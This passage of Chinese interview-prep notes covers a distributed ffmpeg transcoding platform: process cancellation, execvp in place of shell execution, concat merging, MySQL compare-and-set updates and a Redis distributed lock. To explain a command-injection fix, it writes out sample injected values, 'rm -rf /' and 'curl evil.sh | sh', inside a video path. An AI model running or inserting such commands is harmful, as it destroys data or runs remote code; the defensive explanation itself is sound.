> ① 线程安全（跨线程直接 kill 会与执行线程 `waitpid` 竞态）
> ② 优雅退出（SIGKILL 会留损坏中间产物）
> ③ 解耦

**展开说**：

**线程安全**：ffmpeg 子进程**由执行线程创建并 `waitpid` 回收**。如果 `CancelShard` 的 handler（跑在 RPC 的 work 线程）直接 `kill(pid)`，就和执行线程的 `waitpid` **构成了竞态**——可能 kill 一个已经被回收的 pid（**pid 复用后误杀别的进程**）。

**优雅退出**：`SIGKILL` 写在文件中间会留下**损坏的中间产物**。而 `SIGTERM` 让 ffmpeg 有机会**写完文件尾部（moov atom）、关闭编码器、清理临时文件**。

**标志位是最小同步面**：`std::atomic<bool>` 的读写是**无锁、无竞态**的。实际 kill 由执行线程做——它本来就是子进程的「owner」。

**④ 检测点有「双置」——保证及时响应**（`ffmpeg_executor.cpp:205-216` 和 `247-255`）：

```cpp
// 检测点 1：poll 超时（子进程安静时，最多 1 秒延迟）
if (ret == 0)
{
    if (should_cancel && should_cancel())
    {
        LOG_INFO("ExecuteCommand: cancel requested, sending SIGTERM to pid=%d", pid);
        kill(pid, SIGTERM);
        killed = true;
    }
    if (killed) break;
    continue;
}
...
// 检测点 2：每行进度输出后（有输出时近乎即时响应）
if (should_cancel && should_cancel())
{
    LOG_INFO("ExecuteCommand: cancel requested (inline check), sending SIGTERM to pid=%d", pid);
    kill(pid, SIGTERM);
    killed = true;
    break;
}
```

**FFmpeg 的 `-progress` 每 ~0.5 秒输出一行**，所以实际取消延迟约 **0.5 秒**——**用户感知上就是「立刻停了」**。

**⑤ 优雅退出后再兜底 SIGKILL**（`ffmpeg_executor.cpp:259-275`）：

```cpp
if (killed)
{
    pid_t wr = waitpid(pid, &child_status, WNOHANG);
    for (int i = 0; i < 10 && wr == 0; ++i)      // 10 × 500ms = 5 秒
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        wr = waitpid(pid, &child_status, WNOHANG);
    }
    if (wr == 0)
    {
        LOG_WARN("ExecuteCommand: pid=%d did not exit after SIGTERM, sending SIGKILL", pid);
        kill(pid, SIGKILL);
        waitpid(pid, &child_status, 0);
    }
    child_reaped = true;
}
```

**5 秒的理由**：ffmpeg 收到 SIGTERM 后**需要写文件尾部（moov atom）、关闭编码器、清理临时文件**——这些操作需要时间。给 5 秒是「够它写完，但不会无限等」。

## 五、FFmpeg 执行器

### Q5.1 为什么要用「切片 + 转码一 pass」而不是分两步？

**答（30 秒口述版）**

**因为分两步要编码两遍，而一 pass 只编码一遍。**

**两步方案**：

```text
第一步：Slice（切片）→ 产生中间文件
第二步：Transcode（转码）
        输入 = 中间文件，输出 = 最终文件
         ↑ 需要重新解码一遍、再编码一遍
```

**一 pass 方案**：

```text
ffmpeg -ss {start} -t {duration} -i {input} ... {output}
        ↑ 在 -i 之前，是 input seeking
```

**关键在 `-ss` 的位置**（`ffmpeg_executor.h:109` 的注释）：

> 当 `start_ms` 或 `duration_ms` 不为 0 时，`-ss` 放在 `-i` 之前实现快速 input seeking，配合重编码做到帧精确定位。**不再需要单独的 Slice 步骤。**

**`-ss` 放在 `-i` 之前和之后，行为完全不同**：

| 位置 | 行为 | 速度 | 精度 |
|---|---|---|---|
| **`-i` 之前**（input seeking） | FFmpeg **直接 seek 到关键帧位置开始读** | **快**（不用解码前面的内容） | 依赖关键帧（配合重编码可达帧精确） |
| **`-i` 之后**（output seeking） | FFmpeg **从头解码、丢弃前面的帧** | 慢（要解码 [0, start] 的全部内容） | **精确** |

**我选 input seeking（快）+ 重编码（精确）**——**既快又准**。

**完整的转码命令**（`ffmpeg_executor.cpp:544-630`）：

```cpp
std::vector<std::string> args;
args.push_back("ffmpeg");  args.push_back("-y");
if (start_ms > 0)    { args.push_back("-ss"); args.push_back(std::to_string(start_ms / 1000.0)); }
if (duration_ms > 0) { args.push_back("-t");  args.push_back(std::to_string(duration_ms / 1000.0)); }
args.push_back("-i");  args.push_back(input_path);

std::string resolved = ResolveResolution(target_resolution);
if (!resolved.empty())   { args.push_back("-s");   args.push_back(resolved); }
if (target_bitrate > 0)  { args.push_back("-b:v"); args.push_back(std::to_string(target_bitrate) + "k"); }

args.push_back("-c:v");  args.push_back("libx264");
args.push_back("-preset"); args.push_back("fast");
// 限制编码线程数，防止每个 ffmpeg 用满全部核（默认 -threads 0）
if (threads > 0) { args.push_back("-threads"); args.push_back(std::to_string(threads)); }
args.push_back("-c:a");  args.push_back("aac");
args.push_back("-progress"); args.push_back("pipe:1");
args.push_back("-nostats");
args.push_back(output_path);
```

**顺带说一个我删掉的东西**：早期有一个独立的 `Slice()` 方法，用的是 `-c copy`（流拷贝，不重编码）。**删掉了**，因为：

**`-c copy` 只能按关键帧切**。视频编码是「GOP 结构」——每个 GOP 以一个**关键帧（I 帧）**开头，后面的 P/B 帧都要参考它。所以 `-c copy` 只能在关键帧边界切。

如果 `shard_duration_sec = 15`，但关键帧间隔是 2 秒、15 秒处不是关键帧——那 `-c copy` 会**切在最近的关键帧上**，可能导致 shard 实际时长偏移几秒。

**偏移的后果**：合并出来的视频**时长不对**（30 秒的源切出来只有 28 秒），而且中间可能有重复帧。**这违背了「帧精确」的要求**。

**改成重编码（`libx264`）之后**：编码器可以从任意帧开始编（它会把这个帧编码成一个关键帧），**切点精确到帧**。

**代价是编码一次**——但这本来就是转码任务，**反正要编码**，所以没有额外开销。

**还有一个重要的参数：`-threads`**。

注释写明了理由：

```cpp
// 限制编码线程数，防止每个 ffmpeg 用满全部核（默认 -threads 0）
```

**默认 `-threads 0` 会让 ffmpeg 用满所有 CPU 核**。如果一台机器上跑 4 个并行 shard，每个 ffmpeg 都用满 16 核——**总共 64 个编码线程抢 16 个核**，反而**互相拖慢**（上下文切换开销）。

**限制成 2 个线程之后**：4 个 shard × 2 线程 = 8 线程，**不超订**，每个都能全速跑。**总吞吐反而更高**。

**这是「并发不等于并行」的经典体现**——过度并发会让总吞吐下降。

- Q5.1.1 为什么要 fork+exec 而不是 popen？

#### Q5.1.1 为什么要 fork+exec 而不是 popen？

**答**：**因为 popen 拿不到子进程的 PID，没法取消。**

**问题**：`popen` 返回的是一个 `FILE*`，通过 `pclose` 等待子进程结束——**但整个过程中拿不到 PID**。这意味着：

```text
用户取消任务 → 需要 kill 子进程 → 但不知道 PID → 做不到
```

**结果**：取消只能等子进程**自然结束**。一个 5 分钟的转码任务，用户点了取消还要等 5 分钟——**取消功能形同虚设**。

**升级方案**：`pipe()` + `fork()` + `execvp()` + 手动管理 fd。

**完整实现**（`ffmpeg_executor.cpp:100-311`）：

```cpp
// ── 1. 创建管道 ──
int pipefd[2];
if (pipe(pipefd) != 0) { /* error */ }

pid_t pid = fork();
if (pid < 0) { /* error，close 两个 fd */ }

// ── 2. 子进程 ──
if (pid == 0)
{
    close(pipefd[0]);
    int devnull = open("/dev/null", O_RDONLY);
    if (devnull >= 0) { dup2(devnull, STDIN_FILENO); close(devnull); }

    dup2(pipefd[1], STDOUT_FILENO);
    dup2(pipefd[1], STDERR_FILENO);
    close(pipefd[1]);

    // 构建 argv 数组（execvp 要求）
    std::vector<const char*> argv;
    argv.reserve(args.size() + 1);
    for (const auto& a : args) argv.push_back(a.c_str());
    argv.push_back(nullptr);

    execvp(args[0].c_str(), const_cast<char* const*>(argv.data()));
    _exit(127);                                        // exec 失败
}

// ── 3. 父进程：有 pid，可以 kill ──
```

**注意这里用的是 `execvp` 直接传 argv，不是 `execl("/bin/sh", "sh", "-c", cmd)`**——这是**修过的一个安全问题**（阶段 8 的 #4）：

> **FFmpeg 命令注入**：`/bin/sh -c` 字符串拼接，`"`、`$()`、反引号均未转义。修复：`ExecuteCommand` 签名改 `const std::vector<std::string>& args`，子进程 `execvp(args[0], argv)` 替代 `execl("/bin/sh","sh","-c",cmd)`。

**风险场景**：如果用户提交的视频路径里含有 `; rm -rf /` 或者 `` `curl evil.sh | sh` ``，通过 shell 拼接就会**执行任意命令**。

```text
不安全：sh -c "ffmpeg -i /data/a.mp4; curl evil.sh|sh -o out.mp4"
                               ↑ 注入点
安全：execvp("ffmpeg", ["ffmpeg", "-i", "/data/a.mp4; curl evil.sh|sh", "-o", "out.mp4"])
                              ↑ 整个字符串是一个参数，不会被 shell 解释
```

**`execvp` 不走 shell**——参数以数组形式直接传给内核，**没有 shell 解释就没有注入**。

**顺带说 `_exit(127)`**：`exec` 失败时用 `_exit` 而不是 `exit`——因为 `exit` 会**刷新 stdio 缓冲区、调用 `atexit` 注册的函数**，而在 fork 出来的子进程里做这些是**危险的**（可能重复执行父进程的清理逻辑，或者刷新父进程的缓冲区导致重复输出）。`_exit` 是**直接结束进程**，不做任何清理。

**还有一个细节：不用 `fdopen`/`fgets`**（`ffmpeg_executor.cpp:97`、`:165` 的注释）：

> raw `read()` + 手动分行，替代 `fdopen`/`fgets`（**避免 stdio 与非阻塞 fd 的兼容问题**）

因为我要用 `poll` 做超时控制，所以管道读端是**非阻塞**的。`fgets` 在非阻塞 fd 上的行为**不可靠**（可能返回 NULL 但 errno 不是 EOF），所以改用手动 `read` + 按 `\n` 分行。

**面试官想听什么**

- 一句说清核心：「**popen 拿不到 PID，没法 kill**」
- 知道从 `-c copy`/shell 拼接**改成 `execvp` 是安全修复**（命令注入），能说出注入的具体形式
- 知道为什么用 `_exit(127)` 而不是 `exit(127)`
- 知道为什么不用 `fgets`（非阻塞 fd 上 stdio 不可靠）

### Q5.2 合并是怎么做的？踩过什么坑？

**答（30 秒口述版）**

**用 concat demuxer + `-c copy`（流拷贝，不重编码）。踩过的坑是「并发合并导致产物串片」。**

**合并命令**（`ffmpeg_executor.cpp:646-697`）：

```cpp
// filelist 内容：每行一个 file '路径'
for (const auto& path : input_paths)
    fprintf(fl, "file '%s'\n", path.c_str());
fclose(fl);

std::vector<std::string> args = {
    "ffmpeg", "-y",
    "-f", "concat", "-safe", "0",
    "-i", filelist_path,
    "-c", "copy",
    output_path
};
FfmpegResult result = ExecuteCommand(args);
std::remove(filelist_path.c_str());     // 用完即删
```

**两个参数说明**：

- **`-f concat`**：用 concat demuxer，它读一个「文件列表」然后按顺序把文件当成一个连续的流；
- **`-c copy`**：**流拷贝，不重新编码**。因为每个 shard 已经是同样参数的 H.264/AAC，直接拼接码流就行。**所以合并是秒级的**（30 秒视频合并大约 1 秒）。

**如果 shard 的编码参数不一致**（比如分辨率不同），`-c copy` 会失败或者产生损坏的产物。**这是「合并能秒级完成」的前提**——因为所有 shard 都是同一个 Scheduler 用同一套参数切出来的。

**⚠️ 踩过的坑：并发合并导致产物串片。**

**问题**：最初 filelist 用的是**固定的文件名**：

```cpp
std::string filelist_path = output_dir + "/filelist.txt";     // ← 固定名
```

如果两个 job 同时合并，它们会**交错写同一个 `filelist.txt`**：

```text
Job A：写 filelist.txt = "file 'a_0.mp4'\nfile 'a_1.mp4'\n"
Job B：写 filelist.txt = "file 'b_0.mp4'\nfile 'b_1.mp4'\n"     ← 覆盖了 A 的
Job A：ffmpeg -f concat -i filelist.txt ...                     ← 读到 B 的内容！
```

**结果就是「串片」**——A 的产物里混进了 B 的分片。**而且这个产物看起来是正常的**（能播放、时长对），只是内容不对。**极其难发现。**

**修复**（`ffmpeg_executor.cpp:661-665` 的注释）：

```cpp
// #11 修复：filelist 用含输出名的唯一文件（output 形如 {job_id}_merged.mp4，
// 派生名必然唯一），不再跨 job 共享固定名 filelist.txt——并发 merge 时
// concat 不再读到对方 job 的 file 条目导致产物串片。
std::string output_basename = output_path.substr(output_path.find_last_of('/') + 1);
std::string filelist_path = output_dir + "/." + output_basename + ".filelist.txt";
```

**关键洞察**：**输出文件名里已经包含了 `job_id`**（`{job_id}_merged.mp4`），所以从它派生的 filelist 名字**天然唯一**。不需要额外的随机数或者 UUID。

**而且用了隐藏文件名（前缀 `.`）**——这样 `ls` 不会看到这些临时文件。

**⚠️ 还有一个相关的坑：Merge 的重复执行。**

即使 filelist 唯一了，**同一个 job 也不该被合并两次**。有两个并发来源：

1. **两个 worker 线程同时过 `CheckJobDone`** → 都判定 SUCCESS → 都触发 merge；
2. **`TerminalSweepLoop`（15 秒一轮）再次判定 SUCCESS** → 再 merge 一次。

**修复用了「互斥集」**：

```cpp
// Merge 互斥集：防止并发/重复 merge 毁掉成品视频
static std::mutex& MergeMutex() { static std::mutex m; return m; }
static std::unordered_set<std::string>& MergingJobs() { static std::unordered_set<std::string> s; return s; }
```

**在 `MarkJobTerminal` 里**：

```cpp
if (status == JobStatus::JOB_SUCCESS)
{
    std::lock_guard<std::mutex> lock(MergeMutex());
    if (MergingJobs().count(job_id))
    {
        LOG_INFO("...: merge for job=%s already in progress or completed, skipping (fix #7)");
        goto skip_merge;
    }
    MergingJobs().insert(job_id);
    ...
    if (merge_result.success) { /* 成功：永久登记，不再 erase */ }
    else { MergingJobs().erase(job_id); /* 失败：撤销登记，允许重试 */ }
}
```

**这个设计我比较满意，核心是「mutex 管同时、set 管先后」**（`doc/设计问题/业务/12. Merge互斥集设计.md`）：

> - **mutex** 管「**同一时刻**」——防止两个线程同时进入合并代码；
> - **set** 管「**跨越时刻**」——防止另一个线程**稍后**再次进入（`TerminalSweepLoop` 15 秒后又判一次 SUCCESS）。

**只用锁是不够的**：

```text
[00:00] 线程 A：拿锁 → 检查 set（空）→ 开始 merge → 放锁
[00:00] 线程 A：merge 完成 → 放锁
[00:15] TerminalSweepLoop：拿锁 → 检查 set —— 如果没有 set，这里会再 merge 一次！
```

**锁只保护「同一时刻」，保护不了「15 秒后又来一次」**——因为那时候锁早就释放了。

**`set` 是「跨轮次的持久记忆」**：成功了就永久登记（防重复合并），失败了就撤销登记（允许重试收敛）。**这个「成功登记 / 失败撤销」的语义形成了一个闭环。**

**面试官想听什么**

- 能说清 `-f concat -safe 0` + `-c copy` 的含义，以及**为什么能秒级完成**（前提是 shard 参数一致）
- 能说清**串片坑的机理**（固定文件名 + 并发写）以及修复思路（从输出名派生唯一名）
- 能说清 **「mutex 管同时、set 管先后」**这个设计——**这是最出彩的部分**
- 知道「成功永久登记 / 失败撤销登记」的闭环语义

## 六、MySQL 持久化

### Q6.1 为什么要用 MySQL 替代内存 Store？

**答（30 秒口述版）**

**因为「多进程部署」这个事实——进程内的单例 Store 在多进程下是隔离的。**

**阶段 9 之前的架构**：

```text
三个 Store（JobStore / ShardStore / WorkerStore）
  = 单例 + unordered_map + shared_mutex
  = 完全在进程内存里
```

**问题**（`common_store.h` 的注释）：

> ⚠️ 进程内单例，多进程部署时各进程 Store 完全隔离，跨进程共享通过 RPC 同步。

**后果**：`Scheduler` 改了 job 状态，`JobService` **看不见**——必须靠 RPC 通知。于是有了：

- `UpdateJobStatus` RPC（通知状态变更）；
- `NotifyJobCanceled` RPC（通知取消）；
- `QueryJob` RPC（跨进程查询 shard_count）。

**这套「跨进程同步」机制的问题**：

**① 服务重启数据全丢**。这是最致命的——`kill` 掉 Scheduler，所有 shard 状态**全部回到初始**。阶段 8 的审查里就发现了：

> **#2 Scheduler 重启后 shard 状态全丢，「启动恢复」是死代码**（在空 store 上跑，recovered 恒 0）。

**② 同步 RPC 是「快照写入」，会污染权威数据**。

`UpdateJobStatus` 的语义是「我把本地的 job 快照推给你」。但如果**本地快照是旧的**，推过去就会**覆盖新状态**。

**这正是阶段 8 修的 bug #3**：

> **查询接口 retry=N/0 显示不一致**：Scheduler/RC 的 `UpdateJobStatus` 通知 shard 快照漏填 `max_retry`，JobService 幂等覆盖把 max_retry 清零。

**③ 一致性责任分散**。每个服务都要「记得同步」，漏一处就出问题。

---

**阶段 9 的改造**：

| 维度 | 改造前 | 改造后 |
|---|---|---|
| 数据源 | 进程内存 | **MySQL 唯一数据源** |
| 跨进程共享 | RPC 同步 | **天然共享**（都读同一个库） |
| 重启存活 | ❌ 丢数据 | ✅ 数据还在 |
| 同步 RPC | `UpdateJobStatus` / `NotifyJobCanceled` | **删除** |
| 一致性 | 应用层保证 | **MySQL 事务 + 条件更新** |

**最有价值的改造成果是「删掉了两个 RPC」**——因为**一致性责任全部移交给数据库**了。

`doc/设计问题/业务/13.` 里的原话：

> 「快照写入反而会污染权威数据」；「一致性责任全部移交数据库」。

**为什么「删掉 RPC」是进步而不是退步**——因为**「不共享内存、只共享数据库」是一个更强的架构约束**：

| 方案 | 一致性来源 | 出错方式 |
|---|---|---|
| 内存 + RPC 同步 | **应用层代码**（记得同步、快照要新） | 漏同步、快照过期、部分失败 |
| 共享数据库（CAS） | **数据库的事务语义** | 几乎不会错 |

**「把正确性建立在更难出错的基础上」**——数据库的行级原子性已经被无数生产系统验证过，而「我记得在每个地方都同步」是**靠纪律**的。

**代价是性能**（每次操作一次 SQL 往返），但实测下来可以接受：

| 操作 | 平均耗时 |
|---|---|
| `Insert` | 0.186 ms |
| `UpdateIfStatus` | **0.166 ms** |
| `Get` | 0.168 ms |
| `ShardUpdate` | 0.621 ms |

**平均约 0.2ms**，远低于验收线（<2ms）。而且**本机单条主键查询 <0.2ms，缓存带来的收益为零**——所以后来还做了一个决定：**不做读缓存**。

**面试官想听什么**

- 能说清「**进程内单例在多进程下是隔离的**」这个根本问题
- 知道改造的**最大成果是「删掉了两个跨进程同步 RPC」**
- 能论证「共享数据库」比「内存 + RPC 同步」是**更强的一致性约束**（把正确性建立在更难出错的基础上）
- 知道实测性能数据（~0.2ms）

**可能追问**

- Q6.1.1 那为什么不做读缓存？

#### Q6.1.1 那为什么不做读缓存？

**答**：**因为「本机单条主键查询 <0.2ms，缓存收益为零、复杂度收益为负」。**

这个结论是**先试过、再否掉的**（`doc/设计问题/业务/13.`）：

> **纯 MySQL vs 双写内存缓存**：「读内存缓存时进程 B 看不到进程 A 写入 MySQL 的更新…**永久陈旧**」；「本机单条 PK 查询 <0.2ms…**缓存收益为零，复杂度收益为负**」。

**双写缓存的致命问题：跨进程不可见。**

```text
进程 A：写 MySQL（jobs 表更新）→ 写自己的内存缓存
进程 B：读自己的内存缓存 → 看不到 A 的更新  → 展示旧状态
```

**这不是「可能有点旧」，而是「永久陈旧」**——因为进程 B 的缓存**没有任何失效机制**（A 又不知道 B 有缓存）。

**要修的话需要**：
1. **失效通知**（A 写完通知所有进程）→ 又回到了「跨进程同步 RPC」的老路；
2. **或者 TTL**（比如 1 秒过期）→ 那「1 秒内的不一致」还是存在，而且缓存命中率被 TTL 拉低。

**而收益是什么呢**——省下 0.2ms 的查询。**为一个 0.2ms 的操作引入一套跨进程失效机制，明显不划算。**

**RDMA 的环境下，MySQL 的延迟已经足够低**：
- 本机 Unix socket / 回环：**<0.2ms**；
- 同机房网络：通常 0.5~1ms。

而 RPC 调用的 P50 是 **56 微秒 ~ 几百微秒**——**数据库查询和一次 RPC 是同一个量级**。如果连数据库查询都要缓存，那整个 RPC 链路都得重新设计。

**那什么时候该加缓存**——当出现这三种情况之一：
1. **查询变复杂**（JOIN、聚合、模糊搜索）——不再是单条主键查询；
2. **数据量让查询变慢**（百万行以上的表）；
3. **读放大**（一次业务操作触发几十次查询）。

**只有 Redis 那样的「跨进程共享缓存」才值得引入**——因为它是**所有进程看到同一份缓存**，不存在「进程 B 看不到 A 的更新」的问题（除非 TTL 内）。这也正是我在**服务发现**上用 Redis 的原因（Q7.x 和 mprpc 文档的 ZK 三级缓存）。

**面试官想听什么**

- 能说出「**双写内存缓存跨进程不可见 → 永久陈旧**」这个核心问题
- 能**量化收益**（0.2ms vs 引入失效机制的复杂度）
- 能说出**什么时候该加缓存**（查询复杂 / 数据量大 / 读放大）

### Q6.2 `UpdateIfStatus` 是怎么解决并发覆盖的？

**答（30 秒口述版）**

**把「快照读到的前置状态」作为 SQL 的 WHERE 条件——用 MySQL 的行级原子性做 CAS。**

**问题场景**：MySQL 化之后，同一行会被**多个进程**共同推进：

```text
jobs 表：JobService（PENDING/CANCELED）+ Scheduler（SCHEDULING/RUNNING）+ RC（SUCCESS/FAILED）
shards 表：Scheduler（分配/重扫/重试）+ RC（SUCCESS/FAILED）
```

**朴素的 `UPDATE` 是「全量覆盖」**：

```cpp
// 反例
auto job = JobStore::Get(job_id);      // ① 读出快照：status = SCHEDULING
job.status = JOB_RUNNING;               // ② 本地修改
JobStore::Update(job_id, job);          // ③ 全量写回
```

**如果 ② 和 ③ 之间，别的地方把状态推进到了 SUCCESS**：

```text
时间线：
进程 A：Get → status = SCHEDULING
进程 B：Get → status = SUCCESS，写回 SUCCESS        ← 任务完成了
进程 A：写回 RUNNING                                 ← 把 SUCCESS 覆盖回了 RUNNING！
```

**结果：一个已经完成的任务被打回 RUNNING**——如果这发生在终态上，可能导致**任务被重新调度、重新转码**。

**`UpdateIfStatus` 的解法**（`common_store.cpp:186-224`）：

```cpp
bool JobStore::UpdateIfStatus(const std::string& job_id,
                              const std::vector<int32_t>& expect_statuses,
                              const JobRecord& job)
{
    MysqlConnectionGuard g(MysqlPool::GetInstance());
    if (!g.ok()) return false;

    std::ostringstream sql;
    sql << "UPDATE jobs SET user_id='" << g.Escape(job.user_id)
        << "',input_path='" << g.Escape(job.input_path)
        // ... 全量覆盖所有列 ...
        << ",updated_at=" << job.updated_at
        << " WHERE job_id='" << g.Escape(job_id) << "'";

    if (!expect_statuses.empty())
    {
        sql << " AND status IN (";
        for (size_t i = 0; i < expect_statuses.size(); ++i)
        { if (i > 0) sql << ","; sql << expect_statuses[i]; }
        sql << ")";
    }

    if (!g.Execute(sql.str())) { LOG_ERROR(...); return false; }
    // CLIENT_FOUND_ROWS：值未变化时也返回匹配行数，不会误判为未命中
    return g.AffectedRows() > 0;
}
```

**`Update()` 就是「无条件版」**：

```cpp
bool JobStore::Update(const std::string& job_id, const JobRecord& job)
{
    return UpdateIfStatus(job_id, {}, job);      // 空 expect_statuses = 不检查状态
}
```

**调用方的统一模式**：

```cpp
int from_status = job.status;                  // ① 快照前置状态
job.status = NEW_STATUS;                        // ② 本地改
JobStore::GetInstance().UpdateIfStatus(         // ③ 带条件写回
    job_id, {from_status}, job);
```

**这就是一个 CAS**：`WHERE status = 我刚读到的值` —— 如果状态变了，`UPDATE` 影响 0 行，`AffectedRows() > 0` 为 false，调用方知道「有人抢先了」。

**关键设计问题一：为什么用「状态」当版本号，而不是加一个 `version` 字段？**

`doc/设计问题/业务/8. 防并发覆盖机制设计.md` 的三个理由：

> 1. **状态字段本身就是天然的版本号**；
> 2. **expect 集合比 version 更精确**——比如启动恢复只允许重置 `{ASSIGNED, RUNNING}`，不允许动已经是 `WAITING` 的；
> 3. 不用维护额外的字段。

**第 2 点是最重要的**：「版本号」只能表达「比某个版本新」，而「状态集合」能表达**语义约束**。

**举例**：Scheduler 启动恢复时，它想做的事情是「**把崩溃前残留的 in-flight shard 重置**」——**只该动 ASSIGNED 和 RUNNING 的**：

```cpp
ShardStore::GetInstance().UpdateIfStatus(
    shard_id,
    {ASSIGNED, RUNNING},        // ← 只允许这两个前置状态
    shard);
```

**用 version 做不到这个语义**——它只知道「版本号对不对」，不知道「这个状态转换是否合法」。

**关键设计问题二：`CLIENT_FOUND_ROWS` 为什么必须设？**

```cpp
// mysql_pool.cpp:65
mysql_real_connect(conn, host, user, password, dbname, port, nullptr, CLIENT_FOUND_ROWS)
```

**默认情况下，MySQL 的 `affected_rows` 返回的是「实际发生变化的行数」**——如果 `UPDATE` 的值和原值完全一样，返回 **0**。

**这会导致误判**：假设我用旧快照（但内容完全相同）去更新，`affected_rows = 0` → `UpdateIfStatus` 返回 false → 调用方以为「状态不匹配，放弃推进」。

**但实际上状态是匹配的**，只是「写回的值和原值一样」。

**`CLIENT_FOUND_ROWS` 让 `affected_rows` 返回「匹配的行数」**——只要 `WHERE` 条件匹配上，即使值没变也返回 1。

**这是 `UpdateIfStatus` 返回值正确性的隐性前提**——不设这个 flag，整个机制就不可靠。**这个细节在 `mysql_pool.h:21-23` 的注释里写明了**。

**第三个关键问题：失败哲学——「不重试不覆盖」。**

`doc/设计问题/业务/8.` 里写得很清楚：

> 失败哲学 = **不重试不覆盖、交给兜底循环收敛**（这也是所有状态推进点都处于某个循环内的原因）。

**`UpdateIfStatus` 返回 false 时，调用方不报错、不重试、不强行覆盖**——只是放弃这次推进。

**为什么这样是对的**：

**因为「推进失败」通常意味着「别的进程已经做了这件事」或者「状态已经不是我预期的了」**——在这两种情况下，**重试都是错的**。

**但「放弃」会不会导致某些推进永久丢失**？**不会**——因为**所有的状态推进点都在某个循环里**：

| 推进 | 所在的循环 |
|---|---|
| 分配 shard | `SchedulingLoop`（2~5 秒一轮） |
| 超时重扫 | `SchedulingLoop`（30 秒一轮） |
| 终态判定 | `TerminalSweepLoop`（15 秒一轮） |
| PENDING job 重调度 | `PendingScanLoop`（10 秒一轮） |

**所以「这次不成功」= 「下一轮再来」**。这个「**放弃 + 循环兜底**」的模式，让代码里**不需要任何重试逻辑**，也不需要担心「重试导致重复推进」。

**面试官想听什么**

- 能说清 CAS 的机制（`WHERE status IN (快照状态)`），以及**为什么用状态而不是 version 字段**（语义约束更精确）
- 知道 **`CLIENT_FOUND_ROWS` 是返回值正确性的隐性前提**
- 能说清「**不重试不覆盖、交给循环收敛**」这个失败哲学，以及**为什么它成立**（所有推进点都在循环里）

## 七、Redis：快照与分布式锁

### Q7.1 Redis 在平台里承担什么职责？

**答（30 秒口述版）**

**两个职责：Worker 负载快照（读路径加速）+ 分布式锁（防重复分配）。定位是「可降级组件」。**

**职责一：Worker 负载快照。**

**问题**：`Scheduler` 每 2~5 秒一轮调度，每轮都要知道「哪些 Worker 在线、负载如何」——如果每轮都发一次 `ListWorkers` RPC，**调度频率和 RPC 频率绑定了**。

**方案**：`WorkerManager` 收到心跳时**双写 Redis**（`worker_manager.cpp:71-118`）：

```cpp
// 依据心跳，填入 work 最新信息，如果 work 死亡，那就返回 false（心跳先落 MySQL）
bool alive = WorkerStore::GetInstance().UpdateHeartbeat(
    load.worker_id(), load.running_shards(), load.cpu_usage(), load.memory_usage());

// 向 Redis 写内容（alive 才写快照，确保写入 mysql 成功的条件下进行）
if (alive)
{
    auto& redis = RedisClient::GetInstance();
    if (redis.inited() && redis.enabled())
    {
        auto w_opt = WorkerStore::GetInstance().Get(load.worker_id());
        if (w_opt.has_value())
        {
            const auto& w = w_opt.value();
            std::string snapshot =
                w.ip + "|" + std::to_string(w.port) + "|" +
                std::to_string(w.cpu_cores) + "|" + std::to_string(w.memory_mb) + "|" +
                std::to_string(w.max_running_shards) + "|" + std::to_string(w.current_running_shards) + "|" +
                std::to_string(w.cpu_usage) + "|" + std::to_string(w.memory_usage) + "|" +
                std::to_string(NowMs());
            redis.HSet("worker:load", w.worker_id, snapshot);
        }
    }
}
```

**三个设计细节**：

**① 为什么用「单 key 多 field」（Hash），而不是「每 worker 一个 key」**：

`doc/设计问题/业务/13.` 的理由：

> 「**HGETALL 一次 RTT 取全量**」；「每 worker 一个 key 得 `SCAN worker:load:*`（多轮 RTT + 游标）」。

**用 Hash 之后，一次 `HGETALL worker:load` 就拿到所有 Worker 的负载**——一次往返。而如果用 `worker:load:{worker_id}` 这样的独立 key，取全量需要 `SCAN`（游标迭代，**多轮往返**）。

**② `ts` 内嵌在 value 里，不用 Redis 的 TTL**：

```text
value = "ip|port|cpu_cores|memory_mb|max_running|current_running|cpu_usage|memory_usage|ts"
                                                                                        ↑
                                                                          时间戳在值里面
```

**为什么不给每个 field 设 TTL**——**因为 Redis 的 TTL 是 key 级别的，Hash 的单个 field 不能设 TTL**。

所以把 `ts` 放进 value，**由读取方判断过期**（`scheduler_service.cpp:742-800`）：

```cpp
constexpr int64_t kHeartbeatTimeoutMs = 20000;   // 与 WorkerManager 一致
...
int64_t ts = std::atoll(fields[8].c_str());
// 如果 当前时间 - 上一次心跳时间 > 最大时间 ==> 超时，视为 offline，不加入返回列
if (now - ts > kHeartbeatTimeoutMs) continue;     // 心跳超时 → 视为 OFFLINE
```

**③ `alive` 才写快照**：

```cpp
if (alive) { /* 写 Redis */ }
```

因为 `UpdateHeartbeat` 的 SQL 带了条件 `AND status<>OFFLINE`——已离线的 Worker 心跳**不会刷新记录**（`alive = false`）。这时候不写快照，**避免把「已离线」的 Worker 又写回快照里**。

**职责二：分布式锁。**

```cpp
// scheduler_service.cpp:896-943
// - 锁 key：shard:lock:{shard_id}，value：scheduler:{pid}，TTL 10s（TTL 防持锁进程崩溃后死锁）
// - 释放时 GET 校验 value 相同才 DEL，防误删他人锁
// - Redis 故障降级放行：MySQL 条件更新（WAITING→ASSIGNED）兜底
auto& redis = RedisClient::GetInstance();
bool lock_acquired = false;
std::string lock_key = "shard:lock:" + shard.shard_id;
std::string lock_value;
if (redis.inited() && redis.enabled())
{
    // 保证不同进程 lock_value 不同
    lock_value = "scheduler:" + std::to_string(::getpid());

    // 抢该 shard 的分布式锁（SET NX EX 原子）：防多实例/双路径重复分配
    if (redis.SetNxEx(lock_key, lock_value, 10))
    {
        lock_acquired = true;
    }
    else
    {
        // 区分"锁被占用"与"Redis 故障"
        std::string cur;
        bool found = false;
        if (redis.Get(lock_key, cur, found) && found)
        {
            LOG_INFO("%s: shard %s locked by another instance (value=%s), skip", ...);
            return false;
        }
        else
        {
            // Redis 故障 / 锁不存在 → 降级放行，MySQL 条件更新兜底
            LOG_WARN("%s: distributed lock unavailable for %s, degrade to MySQL "
                     "conditional update", caller, shard.shard_id.c_str());
        }
    }
}
```

**这里有个我认为很关键的设计——「三态区分」**：

`SETNX` 失败后，**不能简单认为「锁被占用了」**——因为 `SETNX` 失败有两种原因：

| 情况 | `GET` 的结果 | 处置 |
|---|---|---|
| **锁被别人持有** | `found = true` | **跳过**（正常） |
| **Redis 故障** | `found = false`（GET 也失败） | **降级放行** |

**大多数实现会把这两种混为一谈**——`SETNX` 失败就跳过。但那样的话，**Redis 一挂，整个调度就停了**（所有 shard 都「抢不到锁」）。

